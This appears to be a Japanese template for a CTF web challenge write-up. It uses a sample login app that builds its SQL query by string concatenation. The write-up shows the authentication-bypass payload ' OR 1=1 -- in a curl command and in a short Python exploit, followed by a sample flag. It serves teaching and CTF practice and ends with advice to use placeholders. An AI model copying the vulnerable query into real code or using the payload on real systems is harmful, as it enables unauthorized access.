---
tags:
  - web
  - SQLi
---

# Sample Challenge (web, 100pts)

!!! info "問題情報"
    - **カテゴリ**: web
    - **配点**: 100 pts
    - **解いた人**: @username
    - **配布ファイル**: `app.py`, `Dockerfile`

## 概要

問題の概要を1〜2文で。どんなアプリで、何がゴールか。

## 調査

気づいたこと、ソースを読んで分かったことを書く。コードはこう貼る:

```python
@app.route("/login", methods=["POST"])
def login():
    user = request.form["user"]
    # ↓ 文字列連結。SQLi がありそう
    query = f"SELECT * FROM users WHERE name = '{user}'"
    ...
```

数式も書ける（crypto で便利）:

$$
c \equiv m^{e} \pmod{n}
$$

## 解法

1. ログインフォームに SQLi がある
2. `' OR 1=1 -- ` で認証を回避
3. admin としてログインし flag を取得

```bash
curl -X POST http://host:port/login \
  --data-urlencode "user=' OR 1=1 -- "
```

## Exploit

```python
import requests

URL = "http://host:port"
r = requests.post(f"{URL}/login", data={"user": "' OR 1=1 -- "})
print(r.text)
```

## Flag

??? success "Flag を表示（spoiler）"
    ```
    SECCON{this_is_a_sample_flag}
    ```

## 学び

- 文字列連結で SQL を組み立てない。プレースホルダを使う。
- 参考リンクなどあれば。
